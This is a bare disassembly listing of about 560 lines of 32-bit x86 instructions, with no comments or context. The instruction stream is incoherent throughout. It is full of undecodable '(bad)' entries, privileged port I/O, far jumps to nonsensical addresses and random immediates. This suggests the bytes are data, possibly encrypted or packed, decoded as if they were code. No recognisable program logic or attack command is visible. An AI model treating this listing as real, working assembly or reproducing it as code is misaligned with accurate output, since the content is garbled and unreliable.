  4019df:	mov    ds:0x13d86dd,al
  4019e4:	dec    ebx
  4019e5:	cmp    BYTE PTR [edx],0xc3
  4019e8:	mov    bl,0xe4
  4019ea:	cmp    eax,0xe2d5aa86
  4019ef:	rcr    DWORD PTR ds:0x4c634f92,cl
  4019f5:	xchg   edi,eax
  4019f6:	cld    
  4019f7:	test   eax,0xfc7b1942
  4019fc:	jno    0x4019b1
  4019fe:	stos   DWORD PTR es:[edi],eax
  4019ff:	xor    al,0x37
  401a01:	and    ebx,DWORD PTR [ebp+0x71]
  401a04:	fcom   DWORD PTR [edx-0x44b44978]
  401a0a:	stos   BYTE PTR es:[edi],al
  401a0b:	xor    DWORD PTR fs:[ebp-0x63],0x75
  401a10:	clc    
  401a11:	clc    
  401a12:	fnstcw WORD PTR [eax]
  401a14:	loopne 0x401a3d
  401a16:	push   es
  401a17:	fwait
  401a18:	cdq    
  401a19:	or     eax,0x45ee2291
  401a1e:	mov    edx,0x7a2e9ac6
  401a23:	push   edi
  401a24:	push   ss
  401a25:	out    dx,al
  401a26:	fisub  DWORD PTR [edx]
  401a28:	jg     0x401a7d
  401a2a:	je     0x401a73
  401a2c:	pop    es
  401a2d:	fild   WORD PTR [esi]
  401a2f:	push   0xb94b7a9e
  401a34:	or     esp,DWORD PTR [ebp-0x432876df]
  401a3a:	adc    dl,ah
  401a3c:	mov    dl,0xb4
  401a3e:	adc    BYTE PTR [esp+eiz*2-0x6887c934],ah
  401a45:	sub    dh,BYTE PTR [esi+0x66]
  401a48:	xor    BYTE PTR [esi],al
  401a4a:	lods   eax,DWORD PTR ds:[esi]
  401a4b:	ficom  WORD PTR [ecx+0x4a]
  401a4e:	nop
  401a4f:	push   ebp
  401a50:	(bad)  
  401a51:	push   cs
  401a52:	in     eax,dx
  401a53:	mov    dh,0x56
  401a55:	and    al,0xe5
  401a57:	shr    BYTE PTR [ecx],cl
  401a59:	mov    eax,ds:0x95213c81
  401a5e:	or     DWORD PTR [ebx-0x5d],eax
  401a61:	cmp    eax,0x462163a5
  401a66:	add    eax,DWORD PTR [edx+eax*4+0x79a8363f]
  401a6d:	lock in eax,0xb1
  401a70:	ret    0xa0d4
  401a73:	jmp    0x50baf707
  401a78:	sub    dh,al
  401a7a:	lock jmp 0x401ad8
  401a7d:	sbb    dl,dh
  401a7f:	mov    eax,0x66ba00c0
  401a84:	fadd   DWORD PTR [edx+0x19]
  401a87:	std    
  401a88:	push   ss
  401a89:	test   al,0x55
  401a8b:	sar    BYTE PTR [esi-0x4],cl
  401a8e:	lods   al,BYTE PTR ds:[esi]
  401a8f:	sbb    bl,BYTE PTR [edi+0x1b]
  401a92:	xchg   edx,eax
  401a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a94:	sti    
  401a95:	test   al,0x63
  401a97:	mov    ds,WORD PTR [esi]
  401a99:	pop    edx
  401a9a:	jns    0x401a8d
  401a9c:	xor    al,0x38
  401a9e:	jnp    0x401aa4
  401aa0:	inc    edi
  401aa1:	lods   al,BYTE PTR ds:[esi]
  401aa2:	xchg   DWORD PTR [ebx-0x59],edx
  401aa5:	adc    BYTE PTR [edi+0x1f511d58],ah
  401aab:	add    eax,0x312c7e13
  401ab0:	mov    edi,edi
  401ab2:	scas   al,BYTE PTR es:[edi]
  401ab3:	or     al,BYTE PTR [ebx+0x51]
  401ab6:	test   bl,bl
  401ab8:	cmc    
  401ab9:	adc    BYTE PTR cs:[ebx+ecx*1-0x2095c724],dl
  401ac1:	xchg   ecx,eax
  401ac2:	stc    
  401ac3:	push   ss
  401ac4:	out    dx,eax
  401ac5:	xchg   edi,eax
  401ac6:	xor    DWORD PTR [ebx],edi
  401ac8:	sub    DWORD PTR [edi],ebx
  401aca:	pop    esp
  401acb:	cmp    ebp,DWORD PTR [esi+0xf]
  401ace:	or     al,0xab
  401ad0:	sub    edx,DWORD PTR [ebp+0x3af34350]
  401ad6:	sub    dl,BYTE PTR [ecx+0x6d]
  401ad9:	sub    BYTE PTR ss:[edi+0x6],ah
  401add:	mov    dh,0x83
  401adf:	fidivr WORD PTR [esi-0x7f]
  401ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ae3:	or     eax,edi
  401ae5:	enter  0xa9f0,0xc5
  401ae9:	(bad)  
  401aea:	out    0xdd,eax
  401aec:	mov    DWORD PTR [ebp-0x49],ebp
  401aef:	mov    ss,WORD PTR [esi]
  401af1:	iret   
  401af2:	adc    eax,0x9892d0e1
  401af7:	adc    BYTE PTR [edi-0xdb92f26],0xed
  401afe:	les    ebx,FWORD PTR [ecx]
  401b00:	jge    0x401b49
  401b02:	loop   0x401abc
  401b04:	call   0xe606:0x28d42b50
  401b0b:	popa   
  401b0c:	cmp    eax,0xe03db4ab
  401b11:	stos   DWORD PTR es:[edi],eax
  401b12:	xor    BYTE PTR [edi+edi*1],dh
  401b15:	mov    dl,0x64
  401b17:	scas   al,BYTE PTR es:[edi]
  401b18:	sar    BYTE PTR [ebp+edi*2-0x54470be],cl
  401b1f:	lds    esp,FWORD PTR ss:[edi]
  401b22:	and    DWORD PTR [ebp+edx*1+0x5ce5a790],esi
  401b29:	fldcw  WORD PTR [edi]
  401b2b:	hlt    
  401b2c:	adc    BYTE PTR [edi+0x61b4856e],ch
  401b32:	rcl    DWORD PTR [ecx],0xc5
  401b35:	aas    
  401b36:	clc    
  401b37:	jns    0x401b73
  401b39:	rol    dl,1
  401b3b:	in     al,0xf
  401b3d:	retf   0xc152
  401b40:	shl    BYTE PTR [edx+ebx*1+0x96e0a61],0x3f
  401b48:	ss add eax,0x529281d5
  401b4e:	pop    ecx
  401b4f:	xchg   DWORD PTR [edx-0x18c21142],eax
  401b55:	xchg   ebp,eax
  401b56:	lea    edx,[ecx+0x53]
  401b59:	xlat   BYTE PTR ds:[ebx]
  401b5a:	cs cmp dh,ah
  401b5d:	les    esp,FWORD PTR [ebx-0x26]
  401b60:	arpl   WORD PTR [ecx+edx*4-0x1d],si
  401b64:	loop   0x401b43
  401b66:	mov    BYTE PTR [edi-0x6804e945],ch
  401b6c:	inc    eax
  401b6d:	mov    ebx,DWORD PTR [edx-0x22]
  401b70:	sub    dl,bl
  401b72:	push   es
  401b73:	jbe    0x401ba2
  401b75:	rol    al,0xd2
  401b78:	shr    ebp,0x4
  401b7b:	ja     0x401bd3
  401b7d:	jne    0x401bbf
  401b7f:	sub    edx,DWORD PTR [edx]
  401b81:	clc    
  401b82:	push   ds
  401b83:	inc    ebx
  401b84:	popa   
  401b85:	cmp    DWORD PTR [esi+0x30],eax
  401b88:	add    eax,DWORD PTR [ebx+0x69]
  401b8b:	or     ebx,esi
  401b8d:	int    0x60
  401b8f:	aam    0x97
  401b91:	outs   dx,DWORD PTR ds:[esi]
  401b92:	mov    DWORD PTR [edi+0x11],ecx
  401b95:	cmp    ecx,DWORD PTR [eax-0x17]
  401b98:	xchg   DWORD PTR [esi+ebp*2-0x4],ebx
  401b9c:	cmp    al,0x6d
  401b9e:	into   
  401b9f:	fimul  DWORD PTR [edi+0x19]
  401ba2:	push   ds
  401ba3:	jmp    0x8a18:0x74b2e088
  401baa:	and    al,0x43
  401bac:	sub    edx,DWORD PTR [eax]
  401bae:	push   ss
  401baf:	and    al,0xb6
  401bb1:	dec    eax
  401bb2:	cmp    dh,BYTE PTR [ebx+0x40]
  401bb5:	mov    bl,0x11
  401bb7:	(bad)
  401bbc:	mov    dl,0x88
  401bbe:	pop    esp
  401bbf:	pop    esi
  401bc0:	pushf  
  401bc1:	mov    ebx,DWORD PTR [ecx]
  401bc3:	add    ah,dh
  401bc5:	arpl   bx,bx
  401bc7:	inc    esi
  401bc8:	call   0x4705:0x5fed879f
  401bcf:	leave  
  401bd0:	gs hlt 
  401bd2:	in     eax,0x22
  401bd4:	xchg   ebx,eax
  401bd5:	lahf   
  401bd6:	das    
  401bd7:	lods   al,BYTE PTR ds:[esi]
  401bd8:	adc    cl,BYTE PTR [ebx+0x63]
  401bdb:	jg     0x401b89
  401bdd:	cs xchg ebp,eax
  401bdf:	jne    0x401bb3
  401be1:	sahf   
  401be2:	ins    DWORD PTR es:[edi],dx
  401be3:	mov    esi,0x566ad29f
  401be8:	xchg   edi,eax
  401be9:	xor    DWORD PTR ds:0x56e5af3a,esi
  401bef:	mov    BYTE PTR [esi+eiz*1+0x5218236f],cl
  401bf6:	fcom   st(7)
  401bf8:	xchg   ebx,eax
  401bf9:	shl    BYTE PTR [eax-0x3248951f],cl
  401bff:	lock push ds
  401c01:	dec    esi
  401c02:	xchg   ebp,eax
  401c03:	jg     0x401c10
  401c05:	add    DWORD PTR [ebx+0x40fe40a8],0xf9fefbf8
  401c0f:	das    
  401c10:	push   0xb8f7206a
  401c15:	cmc    
  401c16:	adc    al,BYTE PTR [ecx]
  401c18:	pop    ebp
  401c19:	ins    BYTE PTR es:[edi],dx
  401c1a:	stos   BYTE PTR es:[edi],al
  401c1b:	xchg   ebx,eax
  401c1c:	dec    ebx
  401c1d:	push   esp
  401c1e:	(bad)  
  401c1f:	mov    ebx,0x333d2af8
  401c24:	leave  
  401c25:	and    DWORD PTR [eax+0x3f],edx
  401c28:	pusha  
  401c29:	add    al,0xb5
  401c2b:	outs   dx,BYTE PTR ds:[esi]
  401c2c:	je     0x401c5d
  401c2e:	int    0x3f
  401c30:	push   edx
  401c31:	pushf  
  401c32:	pop    es
  401c33:	add    BYTE PTR [edx],dh
  401c35:	aam    0x97
  401c37:	arpl   WORD PTR [edi-0x1c69912a],cx
  401c3d:	mov    edx,DWORD PTR [ebp-0x66]
  401c40:	lods   eax,DWORD PTR ds:[esi]
  401c41:	shr    DWORD PTR ds:0xae3de5c6,1
  401c47:	xchg   edx,eax
  401c48:	lods   al,BYTE PTR ds:[esi]
  401c49:	icebp  
  401c4a:	pop    eax
  401c4b:	aad    0xea
  401c4d:	or     DWORD PTR [edi+0x75],esp
  401c50:	xor    esp,DWORD PTR [ecx+edx*2+0x1982b898]
  401c57:	(bad)  
  401c58:	out    0xe7,eax
  401c5a:	inc    edx
  401c5b:	sub    eax,0xf1604a5d
  401c60:	cmp    eax,0x371bacc2
  401c65:	push   ds
  401c66:	inc    esi
  401c67:	jnp    0x401cb1
  401c69:	jne    0x401c89
  401c6b:	cdq    
  401c6c:	mov    ah,0x24
  401c6e:	jb     0x401bff
  401c70:	rcr    BYTE PTR [esi-0x634dccfb],0x81
  401c77:	adc    al,0xfb
  401c79:	inc    esp
  401c7a:	ret    0xead
  401c7d:	mov    bh,0x27
  401c7f:	jle    0x401c2a
  401c81:	(bad)  
  401c82:	push   esi
  401c83:	in     al,0x55
  401c85:	push   ds
  401c86:	stc    
  401c87:	addr16 jo 0x401c72
  401c8a:	cwde   
  401c8b:	push   0xffffff97
  401c8d:	xchg   ebp,eax
  401c8e:	lahf   
  401c8f:	arpl   WORD PTR [edx-0x3],sp
  401c92:	call   FWORD PTR [edx]
  401c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c95:	mov    eax,fs
  401c97:	xchg   esi,eax
  401c98:	retf   
  401c99:	jmp    0x797e338c
  401c9e:	or     BYTE PTR [ecx],0xf4
  401ca1:	pusha  
  401ca2:	push   ds
  401ca3:	or     eax,0xa587e06f
  401ca8:	mov    ebx,0x7b73194b
  401cad:	adc    eax,0xd8f49b8d
  401cb2:	push   ds
  401cb3:	sti    
  401cb4:	push   cs
  401cb5:	scas   eax,DWORD PTR es:[edi]
  401cb6:	dec    ebx
  401cb7:	out    0x1,al
  401cb9:	inc    ecx
  401cba:	pop    ss
  401cbb:	shr    DWORD PTR [esi+0x7b659481],0x81
  401cc2:	jb     0x401ca0
  401cc4:	xor    eax,0x5c098381
  401cc9:	les    ecx,FWORD PTR [edi+0x6b]
  401ccc:	push   edx
  401ccd:	jne    0x401c84
  401ccf:	inc    esi
  401cd0:	mov    bl,0x2e
  401cd2:	xchg   ebx,eax
  401cd3:	jmp    0x401cbf
  401cd5:	add    BYTE PTR [esi+0x1a],dl
  401cd8:	icebp  
  401cd9:	cmp    bh,BYTE PTR ds:0xafec13e
  401cdf:	sbb    ah,dl
  401ce1:	jp     0x401ccb
  401ce3:	adc    al,dh
  401ce5:	jmp    0x401c97
  401ce7:	add    DWORD PTR [ebp-0x3459bc8b],0x7d
  401cee:	pusha  
  401cef:	fst    QWORD PTR [esi]
  401cf1:	fimul  DWORD PTR [edx]
  401cf3:	gs jg  0x401cd8
  401cf6:	xlat   BYTE PTR ds:[ebx]
  401cf7:	ds push ebx
  401cf9:	add    dh,al
  401cfb:	jnp    0x401ca4
  401cfd:	leave  
  401cfe:	or     dl,0xd0
  401d01:	icebp  
  401d02:	in     al,0xf5
  401d04:	xor    ebx,ecx
  401d06:	pop    ss
  401d07:	je     0x401cc0
  401d09:	push   0x40
  401d0b:	add    DWORD PTR [ebp+0x2b657b82],esp
  401d11:	fcomp  QWORD PTR [ecx+0x30]
  401d14:	mov    ds:0x26cdcfb5,eax
  401d19:	out    dx,eax
  401d1a:	imul   esp,ecx,0xffffffc5
  401d1d:	add    al,0xaf
  401d1f:	jo     0x401d75
  401d21:	stc    
  401d22:	and    eax,0x47ecf7b8
  401d27:	leave  
  401d28:	dec    edi
  401d29:	cmp    al,0x84
  401d2b:	in     al,0x6
  401d2d:	xchg   edi,eax
  401d2e:	pusha  
  401d2f:	push   eax
  401d30:	mov    esp,0x61f35d3f
  401d35:	stos   DWORD PTR es:[edi],eax
  401d36:	iret   
  401d37:	out    dx,al
  401d38:	aaa    
  401d39:	ja     0x401d0f
  401d3b:	mov    al,0xec
  401d3d:	cmp    eax,0xa09e46e4
  401d42:	jmp    0x500b1593
  401d47:	fimul  WORD PTR [edi-0x18]
  401d4a:	movnti DWORD PTR [edi-0x6d],esp
  401d4e:	imul   ecx,DWORD PTR [eax],0xffffffb4
  401d51:	and    al,0x84
  401d53:	push   es
  401d54:	inc    ebx
  401d55:	ins    BYTE PTR es:[edi],dx
  401d56:	mov    ah,0x4d
  401d58:	pushf  
  401d59:	out    0x6d,eax
  401d5b:	(bad)  
  401d5c:	int3   
  401d5d:	je     0x401d2d
  401d5f:	or     dh,ah
  401d61:	pop    esi
  401d62:	dec    ebp
  401d63:	rol    DWORD PTR [edx],0xc1
  401d66:	std    
  401d67:	rol    edx,1
  401d69:	pop    edx
  401d6a:	sti    
  401d6b:	leave  
  401d6c:	imul   BYTE PTR [ecx-0x45]
  401d6f:	adc    eax,0x9d20aab5
  401d74:	ficom  DWORD PTR [edi]
  401d76:	and    DWORD PTR [ebx-0x2ce54498],0xffffffb5
  401d7d:	jae    0x401d5f
  401d7f:	test   ecx,ecx
  401d81:	ins    DWORD PTR es:[edi],dx
  401d82:	mov    eax,ds:0x850c9670
  401d87:	inc    ecx
  401d88:	jb     0x401d6c
  401d8a:	pop    ebx
  401d8b:	loopne 0x401d73
  401d8d:	inc    ebx
  401d8e:	cmp    DWORD PTR [esi+eiz*8+0x22],ebx
  401d92:	mov    ebp,0x1b1eafaf
  401d97:	xchg   ecx,eax
  401d98:	aas    
  401d99:	push   0x4516ba5b
  401d9e:	cmp    BYTE PTR [esi-0x26],bl
  401da1:	jno    0x401dd0
  401da3:	pop    ds
  401da4:	mov    ch,0xf1
  401da6:	adc    ecx,DWORD PTR [edx]
  401da8:	add    al,0x81
  401daa:	int3   
  401dab:	aas    
  401dac:	and    eax,ebx
  401dae:	push   ss
  401daf:	repz dec edx
  401db1:	mov    edi,0x47ddd093
  401db6:	cmp    al,ch
  401db8:	mov    dh,0xb7
  401dba:	(bad)  
  401dbb:	out    0xb3,eax
  401dbd:	nop
  401dbe:	mov    eax,ds:0xcaeb7768
  401dc3:	inc    ebx
  401dc4:	out    0x53,eax
  401dc6:	fs paddsb mm0,mm0
  401dca:	cld    
  401dcb:	enter  0xf547,0xc3
  401dcf:	repnz int3 
  401dd1:	push   eax
  401dd2:	sbb    eax,0x1b686e50
  401dd7:	enter  0x7c5,0xf
  401ddb:	mov    bh,0xf6
  401ddd:	cmp    DWORD PTR [eax+eax*2-0x6c4be923],0xfffffff4
  401de5:	ja     0x401d86
  401de7:	jle    0x401d6b
  401de9:	dec    ebx
  401dea:	loopne 0x401e47
  401dec:	or     eax,0x3b5561d6
  401df1:	and    cl,bh
  401df3:	mov    ah,0x4a
  401df5:	das    
  401df6:	ss mov ah,0xab
  401df9:	test   BYTE PTR [eax],al
  401dfb:	inc    ebx
  401dfc:	cli    
  401dfd:	and    al,BYTE PTR [edi]
  401dff:	dec    edx
  401e00:	rol    DWORD PTR [ebx],1
  401e02:	mov    DWORD PTR [ecx-0x23],esp
  401e05:	mov    ch,0xd4
  401e07:	mov    DWORD PTR [esi+edi*4+0x248cd0fe],edi
  401e0e:	lods   al,BYTE PTR ds:[esi]
  401e0f:	scas   eax,DWORD PTR es:[edi]
  401e10:	xor    ebp,esi
  401e12:	push   0xde69660d
  401e17:	jge    0x401e12
  401e19:	rcr    DWORD PTR [ebx+0x11b6716d],1
  401e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e20:	pop    esp
  401e21:	call   0x4138:0x7344de9d
  401e28:	(bad)  
  401e29:	push   ebp
  401e2a:	inc    ecx
  401e2b:	mov    cl,0xfc
  401e2d:	push   ebp
  401e2f:	bound  ecx,QWORD PTR [esi+0xa6cfada]
  401e35:	and    ch,BYTE PTR [edi-0x24]
  401e38:	mov    eax,ds:0xc9cab8b1
  401e3d:	inc    esi
  401e3e:	or     BYTE PTR ds:0x45f347ce,dl
  401e44:	out    0x37,eax
  401e46:	loop   0x401e17
  401e48:	pop    esp
  401e49:	push   esi
  401e4a:	movsx  eax,BYTE PTR [ebp-0x10]
  401e4e:	call   0xaab4:0xdd397118
  401e55:	sub    eax,0x2b79ff94
  401e5a:	cmp    ebp,esi
  401e5c:	mov    WORD PTR [ecx-0x40],ds
  401e5f:	xchg   ebx,eax
  401e60:	imul   ebx,DWORD PTR [esi+edi*4-0x66],0x554438de
  401e68:	mov    bh,0xbe
  401e6a:	ret    0xdbed
  401e6d:	test   al,0x68
  401e6f:	cmp    DWORD PTR [ecx-0x5f95afd8],esi
  401e75:	aam    0xae
  401e77:	scas   al,BYTE PTR es:[edi]
  401e78:	inc    edi
  401e79:	sub    DWORD PTR [esi-0x5e3bd155],eax
  401e7f:	scas   eax,DWORD PTR es:[edi]
  401e80:	mov    cl,0xa4
  401e82:	fcmovnbe st,st(0)
  401e84:	inc    eax
  401e85:	xchg   edi,eax
  401e86:	xlat   BYTE PTR ds:[ebx]
  401e87:	jge    0x401e4e
  401e89:	inc    ecx
  401e8a:	cld    
  401e8b:	dec    esi
  401e8c:	lea    edx,[ebx]
  401e8e:	jle    0x401e24
  401e90:	mov    al,0xb7
  401e92:	ja     0x401e47
  401e94:	xlat   BYTE PTR ds:[ebx]
  401e95:	xchg   esp,eax
  401e96:	stos   BYTE PTR es:[edi],al
  401e97:	sahf   
  401e98:	int    0x91
  401e9a:	and    bh,bl
  401e9c:	popf   
  401e9d:	pop    ds
  401e9e:	push   ds
  401e9f:	cmp    BYTE PTR [ebp+0x3393f885],al
  401ea5:	jl     0x401eaf
  401ea7:	aaa    
  401ea8:	and    eax,0x1951d299
  401ead:	shl    BYTE PTR fs:[esi],1
  401eb0:	popf   
  401eb1:	aad    0xa5
  401eb3:	jne    0x401e5f
  401eb5:	jns    0x401e73
  401eb7:	pop    edi
  401eb8:	cmp    edx,DWORD PTR [eax-0xd51ce16]
  401ebe:	dec    ebp
  401ebf:	gs jge 0x401ee1
  401ec2:	or     DWORD PTR [ebx-0x2f],ebx
  401ec5:	sar    BYTE PTR [edi*1+0x641975e1],cl
  401ecc:	jb     0x401e98
  401ece:	xchg   esp,eax
  401ecf:	lahf   
  401ed0:	fcom   st(6)
  401ed2:	xor    al,0xe8
  401ed4:	ret    
  401ed5:	or     esp,0x73d28a15
  401edb:	je     0x401f27
  401edd:	inc    esi
  401ede:	xor    BYTE PTR [eax],ch
  401ee0:	xchg   esp,eax
  401ee1:	xor    bh,ah
  401ee3:	imul   esp,DWORD PTR [ecx],0x10
  401ee6:	dec    edx
  401ee7:	sub    eax,0xa588b112
  401eec:	fidiv  WORD PTR [esp+eax*1-0x73674806]
  401ef3:	ins    DWORD PTR es:[edi],dx
  401ef4:	cli    
  401ef5:	sbb    eax,ecx
  401ef7:	repnz pop edi
  401ef9:	sahf   
  401efa:	cmp    DWORD PTR gs:[ecx],0xffffffab
  401efe:	pop    ecx
  401eff:	sub    ch,BYTE PTR [ebx-0x25d2f51a]
  401f05:	xchg   ebp,eax
  401f06:	jle    0x401eb1
  401f08:	fistp  WORD PTR [edi]
  401f0a:	or     bl,BYTE PTR [ebx]
  401f0c:	sub    bl,BYTE PTR [edi]
  401f0e:	mov    ds:0xf8e1f5a6,eax
  401f13:	push   cs
  401f14:	iret   
  401f15:	adc    al,0x8
  401f17:	mov    ecx,0x10a16
  401f1c:	add    bl,BYTE PTR [ebp+0x286707d2]
  401f22:	js     0x401f11
  401f24:	adc    BYTE PTR [ecx],bh
  401f26:	jecxz  0x401f00
  401f28:	into   
  401f29:	data16 test BYTE PTR [esi-0x63b730e1],dl
  401f30:	daa    
  401f31:	or     ecx,ebp
  401f33:	loop   0x401f14
  401f35:	popf   
  401f36:	scas   al,BYTE PTR es:[edi]
  401f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f38:	rol    ah,0x6
  401f3b:	mov    ebp,?
  401f3d:	push   cs
  401f3e:	bound  edx,QWORD PTR [ebx]
  401f40:	cld    
  401f41:	and    esp,DWORD PTR [eax]
  401f43:	jg     0x401f40
  401f45:	add    dl,0x86
  401f48:	cli    
  401f49:	fbstp  TBYTE PTR [esi+0x5f]
  401f4c:	xchg   edx,eax
  401f4d:	mov    eax,0x18476601
  401f52:	mov    ds,WORD PTR [esp]
  401f55:	fild   WORD PTR [ecx+0x5e]
  401f58:	mov    dh,0x76
  401f5a:	sub    BYTE PTR [edx-0x152220a1],ch
  401f60:	jp     0x401f47
  401f62:	icebp  
  401f63:	dec    ebp
  401f64:	int3   
  401f65:	mov    edx,0x215d7a24
  401f6a:	shl    BYTE PTR [esi+0x7e],1
  401f6d:	and    DWORD PTR [edi+ecx*2+0x3b2cd0e4],0xffffff9f
  401f75:	xor    DWORD PTR [ebx+0x1073a0ea],0x601c4f95
  401f7f:	mov    ds:0x6b62479f,eax
  401f84:	add    ebp,edx
  401f86:	fist   DWORD PTR [eax+ebp*8]
  401f89:	stos   DWORD PTR es:[edi],eax
  401f8a:	mov    eax,0x503e4275
  401f8f:	xchg   BYTE PTR [edi],al
  401f91:	mov    ?,WORD PTR [eax+0x6c6cb9ce]
  401f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f98:	popa   
  401f99:	dec    ebp
  401f9a:	push   ebp
  401f9b:	xchg   ecx,eax
  401f9c:	outs   dx,DWORD PTR ds:[esi]
  401f9d:	mov    ebp,0x4e5d780d
  401fa2:	mov    dl,0xa8
  401fa4:	sub    ebp,DWORD PTR [ecx+0x5]
  401fa7:	test   al,0x7d
  401fa9:	dec    eax
  401faa:	jbe    0x401fcf
  401fac:	or     edi,0xffffff9a
  401faf:	call   esi
  401fb1:	or     al,0xa7
  401fb3:	jbe    0x401fee
  401fb5:	sbb    eax,0x4d5e9b8c
  401fba:	jp     0x402022
  401fbc:	je     0x401fac
  401fbe:	fadd   QWORD PTR [eax-0x4d]
  401fc1:	jmp    0x41b032b4
  401fc6:	rol    DWORD PTR [ebx-0xb],1
  401fc9:	rcl    esi,0x14
  401fcc:	aas    
  401fcd:	mov    esi,0xc0f7a240
  401fd2:	outs   dx,BYTE PTR ds:[esi]
  401fd3:	xor    ah,bl
  401fd5:	cld    
  401fd6:	or     ch,0x28
  401fd9:	std    
  401fda:	ins    BYTE PTR es:[edi],dx
  401fdb:	in     al,dx
  401fdc:	mov    ebx,0xb16540dd
  401fe1:	jecxz  0x402008
  401fe3:	ja     0x401fbc
  401fe5:	call   0xe9caaf
  401fea:	sub    DWORD PTR [ebx-0x1e],esi
  401fed:	and    eax,0xac436dc1
  401ff2:	xor    dl,bl
  401ff4:	sbb    BYTE PTR [ebp+0x6f797527],dh
  401ffa:	sub    al,0x70
  401ffc:	mov    edi,0xea07f810
  402001:	scas   eax,DWORD PTR es:[edi]
  402002:	jl     0x402043
  402004:	loop   0x40200c
  402006:	repz xor bh,dh
  402009:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200b:	jns    0x402003
  40200d:	jo     0x40205d
  40200f:	icebp  
  402010:	mov    ebp,0x9c587e43
  402015:	xchg   esi,eax
  402016:	sbb    DWORD PTR [edx+0x7b],ebx
  402019:	(bad)  
  40201a:	mov    eax,0x95179511
  40201f:	or     dl,BYTE PTR [edx+0x1e737c58]
  402025:	aas    
  402026:	sti    
  402027:	xchg   edx,eax
  402028:	push   edx
  402029:	aam    0x41
  40202b:	scas   eax,DWORD PTR es:[edi]
  40202c:	jno    0x402047
  40202e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40202f:	retf   0x308f
  402032:	add    ah,dh
  402034:	(bad)  
  402035:	pop    esi
  402036:	(bad)  
  402037:	cmp    eax,0x126ab697
  40203c:	lock fmul DWORD PTR [ebx]
  40203f:	retf   
  402040:	xchg   ebx,eax
  402041:	les    esp,FWORD PTR [eax]
  402043:	jmp    0xac1d0562
  402048:	enter  0x35bc,0x3f
  40204c:	idiv   BYTE PTR [edx]
  40204e:	cmc    
  40204f:	lea    ecx,[edi]
  402051:	cmp    dl,bh
  402053:	cmp    DWORD PTR [ebx+ebx*2+0x4f0dec73],0x3d
  40205b:	xchg   esp,eax
  40205c:	mov    ecx,0x2720ec75
  402061:	mov    ebx,esi
  402063:	(bad)  
  402065:	xor    DWORD PTR [ebx-0x1],0xffffffc0
  402069:	sub    DWORD PTR [edx+eiz*4-0x71792cf6],eax
  402070:	nop
  402071:	enter  0x28b6,0x81
  402075:	sahf   
  402076:	inc    eax
  402077:	ror    BYTE PTR [ebp+0x5ff14cac],cl
  40207d:	or     DWORD PTR [bx+di-0xe],esi
  402081:	lds    ebx,FWORD PTR [edx+edx*4]
  402084:	jmp    0x5450131e
  402089:	rol    DWORD PTR [eax+eax*4+0x7500b9e2],1
  402090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402091:	jo     0x402108
  402093:	sub    ecx,DWORD PTR [bx+0x18db]
  402098:	push   edi
  402099:	ins    BYTE PTR es:[edi],dx
  40209a:	fidiv  DWORD PTR [edx-0x7c39cc4]
  4020a0:	adc    al,0x70
  4020a2:	xlat   BYTE PTR ds:[ebx]
  4020a3:	pcmpeqd mm1,QWORD PTR [ebx]
  4020a6:	loopne 0x402092
  4020a8:	lods   eax,DWORD PTR ds:[esi]
  4020a9:	pop    esp
  4020aa:	iret   
  4020ab:	rcr    BYTE PTR [edi],1
  4020ad:	mov    edx,0xe1fb81c4
  4020b2:	xor    esi,0x7f83ccd4
  4020b8:	sub    al,ah
  4020ba:	or     eax,0x7cdee2d9
  4020bf:	les    ebx,FWORD PTR ds:0x4ecb2e20
  4020c5:	inc    ebx
  4020c6:	mov    esi,0x4dffad1b
  4020cb:	dec    edi
  4020cc:	data16 in al,0xce
  4020cf:	or     al,0xc3
  4020d1:	repz ss jge 0x402097
  4020d5:	inc    ecx
  4020d6:	lea    edi,[ebx+0x6d97d646]
  4020dc:	stos   BYTE PTR es:[edi],al
  4020dd:	jp     0x40208d
  4020df:	sbb    bh,BYTE PTR [esi+0x47]
  4020e2:	std    
  4020e3:	adc    eax,0xc664417b
  4020e8:	retf   
  4020e9:	add    al,0xff
  4020eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020ec:	inc    esi
  4020ed:	jno    0x40213a
  4020ef:	repnz add dl,dh
  4020f2:	ins    DWORD PTR es:[edi],dx
  4020f3:	bnd jl 0x402145
  4020f6:	xchg   al,dl
  4020f8:	xor    BYTE PTR [eax-0x29],cl
  4020fb:	mov    ds,WORD PTR [eax]
  4020fd:	test   ah,0x1a
  402100:	mov    ds:0xa241aca1,eax
  402105:	pop    edx
  402106:	cwde   
  402107:	push   ecx
  402108:	mov    bh,0x90
  40210a:	(bad)  
  40210b:	adc    al,0x33
  40210d:	add    dh,bl
  40210f:	sub    BYTE PTR [ecx-0x61f99bcf],dh
  402115:	cli    
  402116:	push   esi
  402117:	inc    eax
  402118:	mov    edx,0x2b6f8f2a
  40211d:	addr16 jne 0x402151
  402120:	adc    al,0xb7
  402122:	jb     0x402163
  402124:	jge    0x40210a
  402126:	lods   al,BYTE PTR ds:[esi]
  402127:	call   FWORD PTR [eax-0x1b]
  40212a:	inc    ecx
  40212b:	or     edx,DWORD PTR es:[esi-0x25]
  40212f:	in     al,0xdd
  402131:	mov    ebp,0xb2583efe
  402136:	cmp    DWORD PTR [ebx-0x57dc2a91],0xca6593aa
  402140:	loopne 0x40211f
  402142:	jmp    0x82cc:0x3b033a9b
  402149:	ds pop edi
  40214b:	lds    esp,FWORD PTR [ebp-0x11]
  40214e:	dec    eax
  40214f:	mov    bh,0x17
  402151:	lea    esi,[edi-0x7d]
  402154:	xor    al,0x88
  402156:	ins    DWORD PTR es:[edi],dx
  402157:	repnz mov ecx,0x8047df47
  40215d:	or     BYTE PTR [esi],dl
  40215f:	or     DWORD PTR [edi],edi
  402161:	je     0x40214e
  402163:	paddsb mm4,QWORD PTR [esi+edi*1]
  402167:	lahf   
  402168:	cmp    eax,0x6f46b521
  40216d:	jbe    0x40210b
  40216f:	lea    eax,[eax-0x47e5fcc0]
  402175:	jmp    0xc87107ba
  40217a:	xchg   DWORD PTR [ecx],esp
  40217c:	sti    
  40217d:	xor    esp,ecx
